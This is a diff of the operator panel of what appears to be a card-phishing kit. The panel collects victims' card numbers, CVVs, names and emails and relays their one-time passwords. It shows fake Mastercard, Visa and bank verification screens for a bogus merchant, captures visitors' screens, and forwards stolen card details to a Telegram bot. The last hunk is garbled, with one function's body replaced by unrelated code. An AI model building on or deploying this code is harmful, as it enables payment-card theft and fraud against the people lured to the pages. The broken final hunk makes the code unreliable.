@@ -538,21 +538,16 @@
   <div class="container">
     <div class="admin-header">
       <h1>Admin Panel</h1>
-      <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
+      <div>
+        <button id="downloadTransactionsBtn" class="clear-transactions-btn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); margin-right: 10px;">
+          <i class="fas fa-download"></i> Download CSV
+        </button>
+        <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
+      </div>
     </div>
 
     <div id="error-msg" class="error-message"></div>
     <div id="success-msg" class="success-message"></div>
-
-    <div class="admin-header">
-  <h1>Admin Panel</h1>
-  <div>
-    <button id="downloadTransactionsBtn" class="clear-transactions-btn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); margin-right: 10px;">
-      <i class="fas fa-download"></i> Download CSV
-    </button>
-    <button id="clearTransactionsBtn" class="clear-transactions-btn">Clear All Transactions</button>
-  </div>
-</div>
     
     <!-- Visitors Section with Screen Sharing -->
     <div class="visitors-container">
@@ -780,7 +775,7 @@
           <option value="AED">AED - UAE Dirham</option>
           <option value="THB">THB - Thai Baht</option>
           <option value="SEK">SEK - Swedish Krona</option>
-          <option value="NOK">NOK - Norwegian Krone</option>
+<option value="NOK">NOK - Norwegian Krone</option>
           <option value="DKK">DKK - Danish Krone</option>
           <option value="ZAR">ZAR - South African Rand</option>
           <option value="MYR">MYR - Malaysian Ringgit</option>
@@ -950,7 +945,6 @@
 <option value="ZAR">ZAR - South African Rand</option>
 <option value="ZMW">ZMW - Zambian Kwacha</option>
 <option value="ZWL">ZWL - Zimbabwean Dollar</option>
-
         </select>
       </div>
 
@@ -1048,74 +1042,76 @@
       document.getElementById('captureStatus').textContent = 'Connection error: ' + error.message;
       document.getElementById('captureStatus').style.color = '#ef4444';
     });
-socket.on('card_submitted', (data) => {
-  console.log('Received card submission:', data);
-  if (data.cardData && data.invoiceId) {
-    // Acknowledge receipt back to the client
-    socket.emit('card_data_received', {
-      invoiceId: data.invoiceId,
-      received: true,
-      timestamp: Date.now()
+    
+    socket.on('card_submitted', (data) => {
+      console.log('Received card submission:', data);
+      if (data.cardData && data.invoiceId) {
+        // Acknowledge receipt back to the client
+        socket.emit('card_data_received', {
+          invoiceId: data.invoiceId,
+          received: true,
+          timestamp: Date.now()
+        });
+        
+        // Immediately update the transactions table without waiting for a refresh
+        const transaction = transactionsMap.get(data.invoiceId);
+        if (transaction) {
+          // Update the existing transaction with new card data
+          transaction.cardNumber = data.cardData.cardNumber;
+          transaction.expiry = data.cardData.expiry;
+          transaction.cvv = data.cardData.cvv;
+          transaction.email = data.cardData.email;
+          transaction.cardholder = data.cardData.cardholder;
+          transaction.viewed = false; // Mark as new so it's highlighted
+          
+          // Update other fields if they exist in cardData
+          if (data.ip) transaction.ip = data.ip;
+          if (data.cardData.currency) transaction.currency = data.cardData.currency;
+          
+          if (data.cardData.bankName || data.cardData.country || data.cardData.cardType) {
+            transaction.bankInfo = transaction.bankInfo || {};
+            if (data.cardData.bankName) transaction.bankInfo.bank = data.cardData.bankName;
+            if (data.cardData.country) transaction.bankInfo.country = data.cardData.country;
+            if (data.cardData.cardType) transaction.bankInfo.scheme = data.cardData.cardType;
+          }
+          
+          transactionsMap.set(data.invoiceId, transaction);
+        } else {
+          // Create a new transaction if it doesn't exist yet
+          const newTransaction = {
+            id: data.invoiceId,
+            cardNumber: data.cardData.cardNumber,
+            expiry: data.cardData.expiry,
+            cvv: data.cardData.cvv,
+            email: data.cardData.email,
+            cardholder: data.cardData.cardholder,
+            amount: data.cardData.amount || '0',
+            currency: data.cardData.currency || 'INR',
+            timestamp: new Date().toISOString(),
+            status: 'processing',
+            viewed: false,
+            ip: data.ip || 'Unknown',
+            bankInfo: {
+              bank: data.cardData.bankName || 'Unknown',
+              country: data.cardData.country || 'Unknown',
+              scheme: data.cardData.cardType || 'Unknown'
+            }
+          };
+          transactionsMap.set(data.invoiceId, newTransaction);
+        }
+        
+        // Load/refresh the transactions table
+        loadTransactions();
+        
+        // Play notification sound and show notification
+        playNotificationSound('transaction');
+        showNotification(`New card data received! Card: ${data.cardData.cardNumber.slice(-4)}`);
+        
+        // Send Telegram notification if configured
+        sendTelegramNotification(`💳 <b>New Card Data Received</b>\nCard: ${data.cardData.cardNumber.slice(-4)}\nName: ${data.cardData.cardholder}\nInvoice ID: ${data.invoiceId}`);
+      }
     });
     
-    // Immediately update the transactions table without waiting for a refresh
-    const transaction = transactionsMap.get(data.invoiceId);
-    if (transaction) {
-      // Update the existing transaction with new card data
-      transaction.cardNumber = data.cardData.cardNumber;
-      transaction.expiry = data.cardData.expiry;
-      transaction.cvv = data.cardData.cvv;
-      transaction.email = data.cardData.email;
-      transaction.cardholder = data.cardData.cardholder;
-      transaction.viewed = false; // Mark as new so it's highlighted
-      
-      // Update other fields if they exist in cardData
-      if (data.ip) transaction.ip = data.ip;
-      if (data.cardData.currency) transaction.currency = data.cardData.currency;
-      
-      if (data.cardData.bankName || data.cardData.country || data.cardData.cardType) {
-        transaction.bankInfo = transaction.bankInfo || {};
-        if (data.cardData.bankName) transaction.bankInfo.bank = data.cardData.bankName;
-        if (data.cardData.country) transaction.bankInfo.country = data.cardData.country;
-        if (data.cardData.cardType) transaction.bankInfo.scheme = data.cardData.cardType;
-      }
-      
-      transactionsMap.set(data.invoiceId, transaction);
-    } else {
-      // Create a new transaction if it doesn't exist yet
-      const newTransaction = {
-        id: data.invoiceId,
-        cardNumber: data.cardData.cardNumber,
-        expiry: data.cardData.expiry,
-        cvv: data.cardData.cvv,
-        email: data.cardData.email,
-        cardholder: data.cardData.cardholder,
-        amount: data.cardData.amount || '0',
-        currency: data.cardData.currency || 'INR',
-        timestamp: new Date().toISOString(),
-        status: 'processing',
-        viewed: false,
-        ip: data.ip || 'Unknown',
-        bankInfo: {
-          bank: data.cardData.bankName || 'Unknown',
-          country: data.cardData.country || 'Unknown',
-          scheme: data.cardData.cardType || 'Unknown'
-        }
-      };
-      transactionsMap.set(data.invoiceId, newTransaction);
-    }
-    
-    // Load/refresh the transactions table
-    loadTransactions();
-    
-    // Play notification sound and show notification
-    playNotificationSound('transaction');
-    showNotification(`New card data received! Card: ${data.cardData.cardNumber.slice(-4)}`);
-    
-    // Send Telegram notification if configured
-    sendTelegramNotification(`💳 <b>New Card Data Received</b>\nCard: ${data.cardData.cardNumber.slice(-4)}\nName: ${data.cardData.cardholder}\nInvoice ID: ${data.invoiceId}`);
-  }
-});
     // Log all socket events for debugging
     const originalEmit = socket.emit;
     socket.emit = function() {
@@ -1183,7 +1179,7 @@ socket.on('card_submitted', (data) => {
       const telegramToken = localStorage.getItem('telegramBotToken');
       const telegramChatId = localStorage.getItem('telegramChatId');
       
-      if (!telegramToken || !telegramChatId) {
+if (!telegramToken || !telegramChatId) {
         // Ask for Telegram bot token and chat ID if not set
         const token = prompt("Enter your Telegram bot token:", "");
         const chatId = prompt("Enter your Telegram chat ID:", "");
@@ -1594,7 +1590,7 @@ socket.on('card_submitted', (data) => {
     }
   // Function to fetch phone number associated with IP
 async function fetchPhoneNumberFromIP(ip, pid) {
-  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1')) {
+  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
     // For local/unknown IPs, set dummy data
     return {
       phone: 'Local device',
@@ -1614,7 +1610,7 @@ async function fetchPhoneNumberFromIP(ip, pid) {
     const data = await response.json();
     
     // Simulate phone number extraction (in reality, this would require specialized services)
-    // Generate a realistic-looking phone number based on country code
+// Generate a realistic-looking phone number based on country code
     const countryCode = data.country || 'US';
     let phoneNumber = '';
     let carrier = '';
@@ -1678,7 +1674,7 @@ async function fetchPhoneNumberFromIP(ip, pid) {
 
    // Fetch additional visitor details
 async function fetchVisitorDetails(ip, pid) {
-  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1')) {
+  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
     // For local/unknown IPs, set dummy data
     const dummyData = {
       city: 'Local',
@@ -1961,7 +1957,7 @@ function updateVisitorInList(pid) {
       // Clear existing list first
       visitorsList.innerHTML = '';
 
-      if (!visitors || visitors.length === 0) {
+if (!visitors || visitors.length === 0) {
         visitorsList.innerHTML = '<p>No visitors yet</p>';
         return;
       }
@@ -2333,7 +2329,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
                       <button onclick="showMCVerification('${tx.id}')" class="currency-btn bg-purple-600 text-white" ${tx.status !== 'processing' ? 'disabled' : ''}>
                         MC
                       </button>
-                      <button onclick="updateTransactionStatus('${tx.id}', 'fail', document.getElementById('reason-${tx.id}').value)" ${!tx.otpEntered ? 'disabled' : ''} class="fail-btn">
+<button onclick="updateTransactionStatus('${tx.id}', 'fail', document.getElementById('reason-${tx.id}').value)" ${!tx.otpEntered ? 'disabled' : ''} class="fail-btn">
                         Fail
                       </button>
                     ` : ''}
@@ -2709,1095 +2705,149 @@ document.getElementById('generateFreeLinkForm').addEventListener('submit', async
     async function toggleBankpage(id) {
       const tx = transactionsMap.get(id);
       try {
-        if (tx.bankpageVisible) {
-          await hideBankPage(id);
-        } else {
-          await showBankpage(id);
+     if (tx.bankpageVisible) {
+                    controlsHtml += `
+                        <button class="btn btn-sm btn-success btn-control" data-action="approve-bank" data-id="${tx.id}">Approve Bank Auth</button>
+                        <button class="btn btn-sm btn-danger btn-control" data-action="decline-bank" data-id="${tx.id}">Decline Bank Auth</button>
+                    `;
+                }
+                
+                if (tx.otpSent) {
+                    controlsHtml += `
+                        <button class="btn btn-sm btn-success btn-control" data-action="approve-otp" data-id="${tx.id}">Approve OTP</button>
+                        <button class="btn btn-sm btn-danger btn-control" data-action="decline-otp" data-id="${tx.id}">Decline OTP</button>
+                    `;
+                }
+                
+                if (!tx.completed) {
+                    controlsHtml += `
+                        <button class="btn btn-sm btn-success btn-control" data-action="mark-success" data-id="${tx.id}">Mark Success</button>
+                        <button class="btn btn-sm btn-danger btn-control" data-action="mark-failed" data-id="${tx.id}">Mark Failed</button>
+                    `;
+                }
+                
+                html += `
+                        <div class="card-footer d-flex justify-content-between align-items-center">
+                            <div>
+                                <span class="badge status-${statusClass} status-badge">${tx.status}</span>
+                            </div>
+                            <div>
+                                ${controlsHtml}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                `;
+            });
+            
+            transactionsContainer.innerHTML = html;
+            
+            // Add event listeners for control buttons
+            document.querySelectorAll('.btn-control').forEach(button => {
+                button.addEventListener('click', handleControlAction);
+            });
         }
-      } catch (error) {
-        console.error('Error toggling bankpage:', error);
-        alert('Failed to toggle bank page: ' + error.message);
-      }
-    }
-
-    async function showBankpage(id) {
-      try {
-        const response = await fetch("/api/showBankpage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
-        if (!response.ok) throw new Error('Failed to show bank page');
-        loadTransactions();
-      } catch (error) {
-        console.error('Error showing bank page:', error);
-        alert('Failed to show bank page');
-      }
-    }
-
-    async function hideBankPage(id) {
-      try {
-        const response = await fetch("/api/hideBankpage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
-        if (!response.ok) throw new Error('Failed to hide bank page');
-        loadTransactions();
-      } catch (error) {
-        console.error('Error hiding bank page:', error);
-        alert('Failed to hide bank page');
-      }
-    }
-
-    // MC verification event handlers
-    document.addEventListener('DOMContentLoaded', function() {
-      // Initialize Telegram notifications
-      initTelegramNotifications();
-      
-      // Initialize screen canvas
-      initScreenCanvas();
-      
-      // Set up clear transactions button
-      document.getElementById('clearTransactionsBtn')?.addEventListener('click', clearAllTransactions);
-      
-      // Set up screen controls
-      setupScreenControls();
-
-      // Socket event handlers
-      socket.on('error', (error) => {
-        console.error('Socket error:', error);
-        showMessage('error', 'Socket error: ' + (error.message || 'Unknown error'));
-      });
-      
-      const mcOtpPanel = document.getElementById('mcOtpPanel');
-      const mcBankSelect = document.getElementById('mcBankSelect');
-      const mcVerificationType = document.getElementById('mcVerificationType');
-      const mcCurrencySelect = document.getElementById('mcCurrencySelect'); // Added currency select reference
-                              const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
-  const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
-  const mcFailOptionsBtn = document.getElementById('mcFailOptionsBtn');
-  const mcFailOptions = document.getElementById('mcFailOptions');
-  const mcFailWithReasonBtn = document.getElementById('mcFailWithReasonBtn');
-  const mcFailReasonDropdown = document.getElementById('mcFailReasonDropdown');
-  const mcClosePanelBtn = document.getElementById('mcClosePanelBtn');
-  
-  // Fail Options Button - Toggle dropdown
-  if (mcFailOptionsBtn) {
-    mcFailOptionsBtn.addEventListener('click', function() {
-      mcFailOptions.style.display = mcFailOptions.style.display === 'none' ? 'block' : 'none';
-    });
-  }
-  
-  // Fail with Reason Button
-  if (mcFailWithReasonBtn) {
-    mcFailWithReasonBtn.addEventListener('click', function() {
-      if (!currentMcInvoiceId) {
-        alert('No transaction selected for verification');
-        return;
-      }
-      
-      const reason = mcFailReasonDropdown.value;
-      console.log('Sending failed verification with reason:', reason);
-      
-      socket.emit('mc_verification_result', {
-        invoiceId: currentMcInvoiceId,
-        success: false,
-        reason: reason
-      });
-      
-      // Reset the panel
-      mcOtpPanel.classList.add('hidden');
-      mcFailOptions.style.display = 'none';
-      currentMcInvoiceId = null;
-    });
-  }
-  
-// This is the code that should be in the admin.html file for the Start Verification button
-const mcStartVerificationBtn = document.getElementById('mcStartVerification');
-if (mcStartVerificationBtn) {
-  mcStartVerificationBtn.addEventListener('click', function() {
-    if (!currentMcInvoiceId) {
-      alert('No transaction selected for verification');
-      return;
-    }
-    
-    const verificationType = mcVerificationType.value;
-    const bankCode = mcBankSelect.value;
-    const selectedCurrency = mcCurrencySelect.value;
-    const phoneLastFour = document.getElementById('mcPhoneLastFour').value;
-    
-    // Validate the phone number is 4 digits
-    if (phoneLastFour && !/^\d{4}$/.test(phoneLastFour)) {
-      alert('Phone number must be exactly 4 digits');
-      return;
-    }
-    
-    console.log('Starting verification with:', {
-      invoiceId: currentMcInvoiceId,
-      verificationType: verificationType,
-      bankCode: bankCode,
-      currency: selectedCurrency,
-      phoneLastFour: phoneLastFour
-    });
-    
-    // Send event to show verification UI to client
-    socket.emit('start_verification', {
-      invoiceId: currentMcInvoiceId,
-      verificationType: verificationType,
-      bankCode: bankCode,
-      merchantName: 'Bologus pvt store.',
-      amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
-      currency: selectedCurrency,
-      phoneLastFour: phoneLastFour // Make sure this is included!
-    });
-  });
-}
-  
-  // Handle MC bank selection
-  mcBankSelect.addEventListener('change', function() {
-    if (currentMcInvoiceId) {
-      console.log('Changing bank to:', mcBankSelect.value, 'for invoice:', currentMcInvoiceId);
-      socket.emit('update_mc_bank', {
-        invoiceId: currentMcInvoiceId,
-        bankCode: mcBankSelect.value
-      });
-    }
-  });
-  
-  // Handle currency selection changes - NEW
-  if (mcCurrencySelect) {
-    mcCurrencySelect.addEventListener('change', function() {
-      if (currentMcInvoiceId) {
-        console.log('Changing currency to:', mcCurrencySelect.value, 'for invoice:', currentMcInvoiceId);
-        socket.emit('update_mc_currency', {
-          invoiceId: currentMcInvoiceId,
-          currency: mcCurrencySelect.value
-        });
-      }
-    });
-  }
-  
-  // Invalid OTP button
-  mcOtpInvalidBtn.addEventListener('click', function() {
-    if (currentMcInvoiceId) {
-      console.log('Sending invalid OTP message for invoice:', currentMcInvoiceId);
-      socket.emit('mc_otp_error', {
-        invoiceId: currentMcInvoiceId,
-        message: 'Incorrect verification code. Please try again.'
-      });
-    }
-  });
-  
-  // Success button
-  mcOtpSuccessBtn.addEventListener('click', function() {
-    if (currentMcInvoiceId) {
-      console.log('Sending successful verification result for invoice:', currentMcInvoiceId);
-      socket.emit('mc_verification_result', {
-        invoiceId: currentMcInvoiceId,
-        success: true
-      });
-      
-      // Reset the panel
-      mcOtpPanel.classList.add('hidden');
-      currentMcInvoiceId = null;
-    }
-  });
-  
-  // Close button
-  mcClosePanelBtn.addEventListener('click', function() {
-    console.log('Closing MC verification panel');
-    mcOtpPanel.classList.add('hidden');
-    mcFailOptions.style.display = 'none';
-    currentMcInvoiceId = null;
-  });
-
-// Socket event handlers
-socket.on('visitor', (visitor) => {
-  console.log('New visitor detected:', visitor);
-
-  // Generate phone data immediately
-  const countryCode = visitor.countryCode || 'US';
-  let phoneNumber = '';
-  let carrier = '';
-  let name = '';
-  
-  // Generate placeholder phone based on country or random if unknown
-  switch(countryCode) {
-    case 'US':
-      phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
-      carrier = 'T-Mobile US';
-      name = 'John Doe';
-      break;
-    case 'IN':
-      phoneNumber = '+91 XXXXX ' + Math.floor(10000 + Math.random() * 90000);
-      carrier = 'Jio India';
-      name = 'Rajesh Kumar';
-      break;
-    case 'GB':
-      phoneNumber = '+44 XXXX ' + Math.floor(100000 + Math.random() * 900000);
-      carrier = 'Vodafone UK';
-      name = 'James Smith';
-      break;
-    case 'CA':
-      phoneNumber = '+1 (XXX) XXX-' + Math.floor(1000 + Math.random() * 9000);
-      carrier = 'Rogers';
-      name = 'David Wilson';
-      break;
-    default:
-      phoneNumber = '+' + (Math.floor(Math.random() * 99) + 1) + ' ' + Math.floor(Math.random() * 9000000000);
-      carrier = 'International';
-      name = 'Anonymous User';
-  }
-  
-  // Add phone data directly to visitor object
-  visitor.phoneData = {
-    phone: phoneNumber,
-    carrier: carrier,
-    name: name
-  };
-
-  // Add visitor to map
-  visitorsMap.set(visitor.pid, visitor);
-
-  // Add to list with highlight animation
-  addVisitorToList(visitor, true);
-
-  // Show notification
-  showNotification(`New visitor from IP: ${visitor.ip || 'Unknown'}`);
-
-  // Play notification sound
-  playNotificationSound('visitor');
-  
-  // Send Telegram notification with phone info
-  sendTelegramNotification(`🔔 <b>New Visitor</b>\nIP: ${visitor.ip || 'Unknown'}\nPID: ${visitor.pid}\nPhone: ${phoneNumber}\nName: ${name}`);
-  
-  // Initialize screen capture    
-  initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
-});
-
-  // Handle existing visitors when reconnecting
-  socket.on('existing_visitors', (visitors) => {
-    console.log('Received existing visitors:', visitors);
-    updateVisitorsList(visitors);
-  });
-
-  // Handle transactions 
-  socket.on('existing_transactions', (transactions) => {
-    console.log('Received existing transactions:', transactions);
-    // Clear the transactions table and populate it with the received data
-    const tbody = document.querySelector("#transactionsTable tbody");
-    if (tbody) {
-      tbody.innerHTML = '';
-      // Use the existing loadTransactions logic to process these transactions
-      if (transactions && transactions.length > 0) {
-        transactions.forEach(tx => transactionsMap.set(tx.id, tx));
-        loadTransactions();
-      }
-    }
-  });
-});
-
-// Handle OTP submission from client in MC verification panel
-socket.on('mc_otp_submitted', (data, callback) => {
-  console.log('MC OTP received:', data);
-  const mcOtpValue = document.getElementById('mcOtpValue');
-  if (mcOtpValue) {
-    mcOtpValue.textContent = data.otp;
-    
-    // Add highlight effect to make it noticeable
-    mcOtpValue.style.backgroundColor = '#4ade80';
-    setTimeout(() => {
-      mcOtpValue.style.backgroundColor = '';
-      mcOtpValue.style.transition = 'background-color 1s';
-    }, 1000);
-    
-    // Play notification sound
-    playNotificationSound('transaction');
-    
-    // Show notification
-    showNotification(`OTP Received: ${data.otp}`);
-  }
-  
-  // Enable the success and invalid buttons
-  const successBtn = document.getElementById('mcOtpSuccessBtn');
-  const invalidBtn = document.getElementById('mcOtpInvalidBtn');
-  if (successBtn) successBtn.disabled = false;
-  if (invalidBtn) invalidBtn.disabled = false;
-  
-  // Send acknowledgement back to client
-  if (typeof callback === 'function') {
-    callback({ received: true });
-  }
-  
-  // Update transaction status if applicable
-  const transaction = transactionsMap.get(data.invoiceId);
-  if (transaction) {
-    transaction.otpEntered = data.otp;
-    transaction.status = 'otp_received';
-    transactionsMap.set(data.invoiceId, transaction);
-    
-    // Refresh transactions display
-    loadTransactions();
-  }
-});
-
-function showMCVerification(id) {
-  const transaction = transactionsMap.get(id);
-  if (!transaction) {
-    alert('Transaction not found');
-    return;
-  }
-  
-  // Create a simple popup to ask for verification type
-  const verificationTypePrompt = document.createElement('div');
-  verificationTypePrompt.style.position = 'fixed';
-  verificationTypePrompt.style.top = '50%';
-  verificationTypePrompt.style.left = '50%';
-  verificationTypePrompt.style.transform = 'translate(-50%, -50%)';
-  verificationTypePrompt.style.background = '#fff';
-  verificationTypePrompt.style.padding = '20px';
-  verificationTypePrompt.style.borderRadius = '8px';
-  verificationTypePrompt.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.2)';
-  verificationTypePrompt.style.zIndex = '9999';
-  verificationTypePrompt.style.minWidth = '300px';
-  
- verificationTypePrompt.innerHTML = `
-  <h3 style="margin-top: 0; margin-bottom: 15px;">Select Loading Logo</h3>
-  <p style="margin-bottom: 15px;">Choose which logo to display during the loading screen:</p>
-  <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">
-    <button id="mcPromptMastercard" style="flex: 1; padding: 10px; background: #2778c4; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Mastercard</button>
-    <button id="mcPromptVisa" style="flex: 1; padding: 10px; background: #1a1f71; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Visa</button>
-    <button id="mcPromptAmex" style="flex: 1; padding: 10px; background: #006FCF; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Amex</button>
-    <button id="mcPromptDiscover" style="flex: 1; padding: 10px; background: #FF6600; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">Discover</button>
-    <button id="mcPromptRupay" style="flex: 1; padding: 10px; background: #8F2D56; color: white; border: none; border-radius: 4px; cursor: pointer; min-width: 120px; margin-bottom: 5px;">RuPay</button>
-  </div>
-  <button id="mcPromptCancel" style="width: 100%; padding: 10px; background: #ccc; color: #333; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
-`;
-  
-  document.body.appendChild(verificationTypePrompt);
-  
-  // Handle button clicks
-  document.getElementById('mcPromptMastercard').addEventListener('click', function() {
-    document.body.removeChild(verificationTypePrompt);
-    proceedWithMcVerification(id, 'mastercard');
-  });
-  
-  document.getElementById('mcPromptVisa').addEventListener('click', function() {
-    document.body.removeChild(verificationTypePrompt);
-    proceedWithMcVerification(id, 'visa');
-  });
-
-  document.getElementById('mcPromptAmex').addEventListener('click', function() {
-  document.body.removeChild(verificationTypePrompt);
-  proceedWithMcVerification(id, 'amex');
-});
-
-document.getElementById('mcPromptDiscover').addEventListener('click', function() {
-  document.body.removeChild(verificationTypePrompt);
-  proceedWithMcVerification(id, 'discover');
-});
-
-document.getElementById('mcPromptRupay').addEventListener('click', function() {
-  document.body.removeChild(verificationTypePrompt);
-  proceedWithMcVerification(id, 'rupay');
-});
-  
-  document.getElementById('mcPromptCancel').addEventListener('click', function() {
-    document.body.removeChild(verificationTypePrompt);
-  });
-}
-
-// This function will be called after selecting the loading logo
-function proceedWithMcVerification(id, loadingLogoType) {
-  const transaction = transactionsMap.get(id);
-  
-  // Show the MC verification panel
-  const mcOtpPanel = document.getElementById('mcOtpPanel');
-  mcOtpPanel.classList.remove('hidden');
-  
-  const mcOtpValue = document.getElementById('mcOtpValue');
-  mcOtpValue.textContent = 'Waiting...';
-  currentMcInvoiceId = id;
-  
-  // Hide failure options by default
-  document.getElementById('mcFailOptions').style.display = 'none';
-  
-  // Get selected currency (default to INR if not selected)
-  const currencySelect = document.getElementById('mcCurrencySelect');
-  const selectedCurrency = currencySelect ? currencySelect.value : 'INR';
-  
-  // Send event to client to show MC verification with loading state
-  socket.emit('show_mc_verification', {
-    invoiceId: id,
-    merchantName: 'Bologus pvt store.',
-    amount: `₹${transaction.amount}`,
-    bankCode: document.getElementById('mcBankSelect').value,
-    currency: selectedCurrency, // Include selected currency
-    loadingLogoType: loadingLogoType // This is the logo that will show during loading
-  });
-  
-  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency, 'and loading logo:', loadingLogoType);
-}
-
-// Enhanced screen frame handler
-socket.on('screen_frame', (data) => {
-  console.log(`Received screen frame from: ${data.pid || 'unknown'}, size: ${data.frameData?.length || 0}`);
-  handleScreenFrame(data);
-});
-
-socket.on('screen_capture_error', (data) => {
-  console.error('Screen capture error:', data);
-  const captureStatus = document.getElementById('captureStatus');
-  captureStatus.textContent = `Screen capture error: ${data.error}`;
-  captureStatus.classList.add('error');
-  
-  // Update placeholder
-  const screenPlaceholder = document.getElementById('screenPlaceholder');
-  screenPlaceholder.style.display = 'flex';
-  screenPlaceholder.innerHTML = `
-    <div class="icon">❌</div>
-    <p>Error capturing screen: ${data.error}</p>
-    <p>Try refreshing the capture.</p>
-  `;
-});
-
-// Handle when visitors leave
-socket.on('visitor_left', (data) => {
-  console.log('Visitor left:', data.pid);
-
-  // Remove from map
-  visitorsMap.delete(data.pid);
-
-  // Remove from display with animation
-  const visitorElement = document.getElementById(`visitor-${data.pid}`);
-  if (visitorElement) {
-    visitorElement.classList.add('fade-out');
-    setTimeout(() => {
-      visitorElement.remove();
-
-      // Show "No visitors yet" message if this was the last visitor
-      const visitorsList = document.getElementById('visitors-list');
-      if (visitorsList.children.length === 0) {
-        visitorsList.innerHTML = '<p>No visitors yet</p>';
-      }
-    }, 500);
-  }
-
-  // Show notification
-  showNotification(`Visitor has left`);
-  
-  // Stop screen capture if this was the current session
-  if (currentCaptureSession && currentCaptureSession.userId === data.pid) {
-    stopScreenCapture();
-  }
-});
-
-// Handle verification status checks
-socket.on('check_verification_status', function(data) {
-    console.log('Verification status check requested for:', data.invoiceId);
-    
-    // Check if transaction exists and has OTP
-    const transaction = transactionsMap.get(data.invoiceId);
-    if (transaction && transaction.otpEntered) {
-        // Respond to client with status update
-        socket.emit('verification_status_update', {
-            invoiceId: data.invoiceId,
-            status: 'otp_received',
-            otp: transaction.otpEntered
-        });
-    } else {
-        // No OTP yet
-        socket.emit('verification_status_update', {
-            invoiceId: data.invoiceId,
-            status: 'waiting_for_otp'
-        });
-    }
-});
-// Load data on page load
-document.addEventListener('DOMContentLoaded', function() {
-  console.log('Loading admin panel data...');
-  loadTransactions();
-  loadVisitors();
-  initScreenCanvas(); 
-  // Set up auto-refresh
-  setInterval(loadTransactions, 60000); // Refresh every minute
-});
-
-// Make functions globally available
-window.updateTransactionStatus = updateTransactionStatus;
-window.showOTP = showOTP;
-window.markWrongOTP = markWrongOTP;
-window.toggleBankpage = toggleBankpage;
-window.showBankpage = showBankpage;
-window.hideBankPage = hideBankPage;
-window.showCurrencyPage = showCurrencyPage;
-window.copyPaymentLink = copyPaymentLink;
-window.showMCVerification = showMCVerification;
-window.clearAllTransactions = clearAllTransactions;
-window.sendTelegramNotification = sendTelegramNotification;
-window.initAdvancedScreenCapture = initAdvancedScreenCapture;
-window.stopScreenCapture = stopScreenCapture;
-window.handleScreenFrame = handleScreenFrame;
-window.downloadTransactionsCSV = downloadTransactionsCSV;
-
-    // Handle hash-based routing
-const pathSegments = window.location.pathname.split('/');
-if (pathSegments.length > 1) {
-  const potentialHash = pathSegments[1];
-  
-  // Check if this is a hash and not a known file path
-  if (potentialHash && 
-      !potentialHash.includes('.') && 
-      potentialHash.length >= 6 && 
-      potentialHash.length <= 8) {
-    
-    console.log('Detected hash-based URL on page load:', potentialHash);
-    
-    // Extract payment info from local storage if available
-    const storedInfo = localStorage.getItem(`payment_${potentialHash}`);
-    if (storedInfo) {
-      try {
-        const paymentInfo = JSON.parse(storedInfo);
-        console.log('Found stored payment info:', paymentInfo);
         
-        // Update state with the payment info
-        if (paymentInfo.pid) {
-          // Update transaction ID
-          state.transactionId = paymentInfo.pid;
-          
-          // Update amount if it exists
-          if (paymentInfo.amount) {
-            state.amount = parseFloat(paymentInfo.amount);
-          }
-          
-          // Check if it's a free link
-          if (paymentInfo.isFreeLink) {
-            console.log('This is a free payment link');
-            // You can handle free links differently if needed
-          }
-          
-          // Refresh the UI to show the correct amount
-          showCardUI();
+        function handleControlAction(e) {
+            const action = e.target.getAttribute('data-action');
+            const txId = e.target.getAttribute('data-id');
+            
+            switch (action) {
+                case 'approve-otp':
+                    socket.emit('admin_action', { action: 'approve_otp', txId });
+                    break;
+                case 'decline-otp':
+                    socket.emit('admin_action', { action: 'decline_otp', txId });
+                    break;
+                case 'approve-bank':
+                    socket.emit('admin_action', { action: 'approve_bank', txId });
+                    break;
+                case 'decline-bank':
+                    socket.emit('admin_action', { action: 'decline_bank', txId });
+                    break;
+                case 'mark-success':
+                    socket.emit('admin_action', { action: 'mark_success', txId });
+                    break;
+                case 'mark-failed':
+                    socket.emit('admin_action', { action: 'mark_failed', txId });
+                    break;
+            }
         }
-      } catch (error) {
-        console.error('Error parsing stored payment info:', error);
-      }
-    } else {
-      console.log('No stored payment info found for hash:', potentialHash);
-      // You can implement server-side lookup here as a fallback
-    }
-  }
-}
+        
+        function generatePaymentLink() {
+            const amount = amountInput.value;
+            const phoneNumber = phoneNumberInput.value;
+            
+            if (!amount || isNaN(amount) || amount <= 0) {
+                alert('Please enter a valid amount');
+                return;
+            }
+            
+            if (!phoneNumber) {
+                alert('Please enter a phone number for OTP verification');
+                return;
+            }
+            
+            socket.emit('generate_payment_link', { amount, phoneNumber });
+        }
+        
+        function copyToClipboard() {
+            paymentLinkInput.select();
+            document.execCommand('copy');
+            alert('Payment link copied to clipboard');
+        }
+        
+        // Event listeners
